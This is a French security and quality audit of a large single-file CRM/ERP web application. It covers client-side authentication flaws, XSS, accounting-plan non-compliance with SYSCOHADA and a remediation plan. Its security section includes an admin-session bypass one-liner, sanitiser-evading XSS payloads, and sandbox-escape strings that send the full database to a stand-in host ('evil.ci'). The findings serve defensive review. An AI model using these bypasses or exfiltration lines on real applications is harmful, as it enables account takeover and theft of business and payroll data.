# AUDIT TECHNIQUE — SanixFactory v5.7 CRM+

Cible : `SanixFactory_v5_7_CRMPlus_SECURISE-1.html`
Volume : 128 979 lignes · 7,5 Mo · 147 `<script>` · 119 `<style>` · 16 870 `<div>` · 52 sections
Date : 2026-09-13

---

## 1. VERDICT

| Axe | Note | État |
|---|---|---|
| Sécurité | 2/10 | Critique |
| Fiabilité | 3/10 | Critique |
| Performance | 4/10 | Faible |
| Conformité SYSCOHADA | 3/10 | Non conforme |
| Maintenabilité | 1/10 | Critique |
| UX / fonctionnel | 7/10 | Bon |

**Non déployable en production.** Le suffixe `SECURISE` est trompeur : le patch sécurité v5.7 introduit autant de régressions qu'il corrige.

---

## 2. CRITIQUE — SÉCURITÉ

### S1. Authentification 100 % côté client
`USERS`, `ROLES`, `SESSION`, `goTo` guard : tout en JavaScript navigateur.

```js
// Console DevTools — contournement total, 1 ligne
SESSION={role:'admin',userId:'admin',name:'X',initials:'X'}; goTo('paie');
```
Impact : accès paie, comptabilité, RH, exports FEC pour tout utilisateur.
**Correctif : Supabase Auth + RLS. Les rôles doivent être appliqués en base, pas en JS.**

### S2. XSS stocké — sanitiseur contournable (vérifié)
1 781 `innerHTML`, 26 `insertAdjacentHTML`, **2** appels d'échappement. Pas de DOMPurify.
`_sanStr` (L128813) est une liste noire. Regex `(\s|"|')on\w+\s*=` : le `/` n'est pas couvert.

```
Entrée : <img/onerror=alert(1)>
Sortie : <img/onerror=alert(1)>   ← intact
Entrée : <body/onload=alert(1)>   → intact
Entrée : <img/**/onerror=…>       → intact
```
Vecteurs : nom client, libellé article, notes, import JSON/CSV, données API.
**Correctif : échapper au rendu (`escapeHtml` systématique) + DOMPurify, pas à la persistance.**

### S3. `_sfSafeInvoke` — `new Function` derrière une liste noire (vérifié)
```
PASSE : self['ev'+'al']('…')
PASSE : navigator.sendBeacon('//evil.ci', JSON.stringify(DB))
PASSE : top.location='//evil.ci/?d='+escape(JSON.stringify(DB))
PASSE : self[atob('bG9jYWxTdG9yYWdl')]
```
La regex bloque `window[` mais pas `self[`, `top`, `parent`, `globalThis[`.
**Correctif : supprimer `new Function`. Registre de handlers nommés `{nom: fn}` + `dataset.action`.**

### S4. Hachage mot de passe insuffisant
`securePass` = SHA-256(sel + '|' + pass), **1 itération**, stocké en localStorage.
GPU : ~10 Md hash/s → mot de passe 8 car. cassé en minutes.
**Correctif : PBKDF2-SHA256 ≥ 210 000 itérations via `crypto.subtle`, ou hachage serveur (bcrypt/Argon2id). Jamais en localStorage.**

### S5. Anti-bruteforce inopérant
`_failCount` / `_lockUntil` sont des variables de closure. **F5 réinitialise le verrou.**
**Correctif : rate-limit serveur (IP + login) ; sinon état persisté + backoff exponentiel.**

### S6. CSP sans valeur
```
script-src 'self' 'unsafe-inline' … ; connect-src *
```
`unsafe-inline` + 2 840 `onclick=` → aucune protection XSS. `connect-src *` → exfiltration libre.
**Correctif : supprimer les handlers inline (délégation d'événements), CSP à nonce, `connect-src` sur liste blanche.**

### S7. Fuite de données vers l'API Anthropic — 3 appels résiduels
| Ligne | Contenu envoyé |
|---|---|
| 55863 | Base clients/prospects (volumétrie) |
| 78644 | TRS, données GMAO, pannes |
| 103891 | Machines critiques, stocks, performances techniciens |

Aucun header `x-api-key` → **401 systématique** (fonctionnalité morte) mais l'intention d'envoi persiste.
L 73667 : `corsproxy.io` — proxy tiers non maîtrisé (code désactivé mais présent).
**Correctif : router les 3 appels vers `window.sfAICall` (déjà sécurisé, L112958). Supprimer le bloc corsproxy.**

### S8. localStorage comme base de données
Quota 5–10 Mo, non chiffré, mono-navigateur, aucune sauvegarde, perdu au vidage du cache.
20 × `JSON.stringify(DB)` — sérialisation intégrale à chaque écriture.
**Deux clés concurrentes** : `SANIX_DB_V2` (L2135) et `sanixfactory_db` (29 écritures directes) → incohérence de state.
**Correctif : PostgreSQL/Supabase. localStorage réservé au cache offline + file de synchro.**

---

## 3. CRITIQUE — FIABILITÉ

### F1. `doLogin` : 12 redéfinitions, chaîne rompue
| Ligne | Couche | Statut |
|---|---|---|
| 17995 | Auth locale | mort |
| 18654 | Auth serveur JWT (async) | **mort** |
| 41554 | Notification rôle + `_genererNotifs` | **mort** |
| 46462 | `_syncRHToAll` | **mort** |
| 48986 | Widgets dashboard, Chart.js, mini-cal, exports | **mort** |
| 49376 | `renderComPerfsV2` + animations KPI | **mort** |
| 128860 | Patch v5.7 — **remplacement sans wrapping** | actif |

Le patch final fait `window.doLogin = function(){…}` sans conserver `_orig`.
**Conséquences : authentification serveur désactivée, graphiques dashboard jamais rendus, notifications métier absentes, synchro RH absente.**

Défaut aggravant : L41554 appelle `_origLogin()` (async) puis lit `SESSION` immédiatement → race condition.

**Correctif : un seul `doLogin`. Remplacer le monkey-patching par un bus d'événements `document.dispatchEvent(new CustomEvent('sf:login'))`.**

### F2. Redéfinitions massives
`goTo` ×40 · `filterRH` ×24 · `openForm` ×17 · `renderAlertes` ×11 · `refreshDash` ×10 · `saveDB` ×8 · `saveEmploye` ×8
Comportement final imprévisible, dépendant de l'ordre de chargement.

### F3. 337 `catch(e){}` vides
Les erreurs de persistance (`QuotaExceeded`), de parsing et de rendu sont avalées silencieusement. Perte de données invisible pour l'utilisateur.

### F4. IDs HTML dupliqués
`gmao-print-zone` ×3 · `syncBar`, `sess-qte`, `sess-date`, `tr-qte`, `param-activite`… ×2
`getElementById` renvoie le premier → formulaires inopérants selon le contexte.

### F5. `Math.random()` — 74 usages
Si utilisé pour des identifiants métier (OF, factures, lots) : collisions. Vérifier chaque occurrence ; utiliser `crypto.randomUUID()`.

---

## 4. NON-CONFORMITÉ SYSCOHADA

**Le plan comptable (L41668) est le PCG français, pas le SYSCOHADA révisé.** Un export FEC serait rejeté par la DGI Côte d'Ivoire.

### 4.1 TVA — inversion totale
| Code fichier | Libellé fichier | Réalité SYSCOHADA révisé | Correct |
|---|---|---|---|
| 4456 | TVA collectée | TVA transférée par d'autres entreprises | **4431** TVA facturée sur ventes |
| 4457 | TVA déductible | (non normalisé) | **4452** TVA récupérable sur achats / **4454** sur services |
| 4458 | TVA à régulariser | — | **4441** TVA due / **4449** crédit de TVA à reporter |

Impact : déclaration TVA fausse, liasse fiscale non recevable.

### 4.2 Classe 6 — codes du PCG français
| Fichier | Libellé | SYSCOHADA réel | Compte correct |
|---|---|---|---|
| 614 | Location et charges locatives | Transports du personnel | **622** |
| 615 | Entretien & réparations | — | **624** |
| 616 | Primes d'assurance | Transports de plis | **625** |
| 621 | Loyers | Sous-traitance générale | **622** |
| 622 | Maintenance | Locations et charges locatives | **624** |
| 623 | Publicité | — | **627** |
| 624 | Transport & déplacements | Entretien/réparations | **61x** |
| 625 | Téléphone & internet | Primes d'assurance | **628** |
| 626 | Services bancaires | — | **631** |
| 627 | Missions & réceptions | Publicité, relations publiques | **638** |
| 631 | Impôts et taxes sur rémunérations | **Frais bancaires** | **641** |
| 641 | Rémunérations du personnel | **Impôts et taxes directs** | **661** |
| 645 | Charges sociales patronales | — | **664** |
| 661 | Intérêts des emprunts | **Rémunérations personnel national** | **671** |
| 671 | Pertes exceptionnelles | **Intérêts des emprunts** | **83x** (HAO) |
| 695 | Impôt BIC | — | **891** |

Collision directe : 641 et 661 portent des sens inversés entre le fichier et la norme.

### 4.3 Classe 7
| Fichier | SYSCOHADA |
|---|---|
| 701 Ventes de produits finis | **701 = Ventes de marchandises** ; produits finis = **702** — inversé |
| 706 Rabais/remises | 706 = Services vendus ; RRR accordés = **709** |
| 71 Variation de stocks | 71 = **Subventions d'exploitation** ; variation = **73** |

### 4.4 Comptes non imputables
`17`, `31`–`37`, `65`, `71`, `72`, `75`, `77`, `91`, `93`, `95` : comptes à 2 chiffres.
Le SYSCOHADA exige un compte divisionnaire (3 chiffres min.) pour toute imputation. Rejet FEC garanti.
`CAT_COMPTES.autre = {debit:'65'}` (L41825) impute directement sur un compte non imputable.

### 4.5 Contradiction interne
`CAT_COMPTES.frais_banque → 631` (juste en SYSCOHADA) alors que `PLAN_COMPTABLE['631']` est libellé « Impôts et taxes sur rémunérations ». Le fichier se contredit.

**Correctif prioritaire : remplacer intégralement `PLAN_COMPTABLE` et `CAT_COMPTES` par le Plan Comptable OHADA révisé (AUDCIF 2017), puis rejouer les écritures existantes via table de correspondance.**

---

## 5. PERFORMANCE

| Constat | Valeur | Impact |
|---|---|---|
| Fichier unique | 7,5 Mo non compressé | > 15 s en 3G, cible < 2 s non tenue |
| Nœuds DOM au chargement | 16 870 `<div>` | 52 sections toutes présentes dans le DOM |
| `setTimeout` | 633 | Orchestration par délais arbitraires (200/800/1400 ms) |
| `setInterval` | 37, dont un à 1 000 ms | CPU permanent, batterie mobile |
| Virtualisation de listes | 3 occurrences | Listes longues non virtualisées |
| `JSON.stringify(DB)` | 20 sites d'appel | Sérialisation complète synchrone à chaque save |

**Correctifs**
1. Découper en modules ES + `import()` dynamique par section.
2. Rendu des sections à la demande, pas au chargement.
3. Remplacer la chaîne de `setTimeout` par des événements.
4. `IntersectionObserver` + virtualisation sur contacts / articles / mouvements / écritures.
5. Persistance : IndexedDB + écriture différentielle, ou Supabase.
6. Servir gzip/brotli.

---

## 6. MAINTENABILITÉ

- 1 fichier · 128 979 lignes · 147 blocs `<script>`
- 538 variables globales `var` majuscules
- 370 IIFE de patch empilées
- 2 840 handlers `onclick` inline
- Zéro test, zéro build, zéro linter, zéro contrôle de version du code métier

Le pattern dominant est l'empilement de correctifs par surcharge. Chaque version ajoute une couche sans retirer la précédente. **Le coût marginal d'une évolution croît de façon exponentielle.** Objectif « 10 ans » inatteignable en l'état.

---

## 7. PLAN DE REMÉDIATION

### P0 — Bloquant (avant toute mise en production)
1. Migrer l'authentification et les autorisations vers Supabase Auth + RLS.
2. Remplacer le plan comptable par le SYSCOHADA révisé (AUDCIF) ; retraiter l'historique.
3. Réparer la chaîne `doLogin` : un seul point d'entrée + bus d'événements.
4. Échappement systématique au rendu + DOMPurify ; retirer `_sanStr`.
5. Supprimer `_sfSafeInvoke` / `new Function` → registre de handlers.
6. Router les 3 appels IA résiduels vers `sfAICall` ; supprimer corsproxy.

### P1 — Élevé
7. PBKDF2 ≥ 210 k itérations ou hachage serveur.
8. Rate-limiting serveur sur l'authentification.
9. Migrer les données vers PostgreSQL ; localStorage = cache seul.
10. Unifier les clés de stockage ; supprimer `SANIX_DB_V2` ou `sanixfactory_db`.
11. Traiter les 337 `catch` vides : journaliser, remonter `QuotaExceeded`.
12. Dédupliquer les IDs HTML.

### P2 — Structurel
13. Découpage en modules ES + bundler (Vite).
14. Supprimer les 2 840 handlers inline → délégation d'événements → CSP à nonce sans `unsafe-inline`.
15. Dédupliquer les 40 `goTo`, 24 `filterRH`, 17 `openForm`, 10 `refreshDash`.
16. Rendu différé + virtualisation.
17. Tests (Vitest) + Playwright sur les parcours devis → facture → écriture.
18. `connect-src` sur liste blanche.

---

## 8. POINTS POSITIFS

- Couverture fonctionnelle large et cohérente : CRM, production, GMAO, stocks, RH/paie, compta, qualité, logistique.
- UX soignée : design system CSS cohérent, mobile-first, PWA, `env(safe-area-inset)`.
- Adaptation africaine réelle : Mobile Money (compte 572), CNPS, DGI, ITS, FDFP, WhatsApp, cartographie Leaflet hors-ligne.
- `sfAICall` (L112958) : centralisation IA correctement sécurisée — le modèle à généraliser.
- Repli offline et file de synchronisation déjà amorcés.

Le socle fonctionnel vaut la reconstruction technique. La priorité est la migration vers une architecture serveur, pas la réécriture métier.
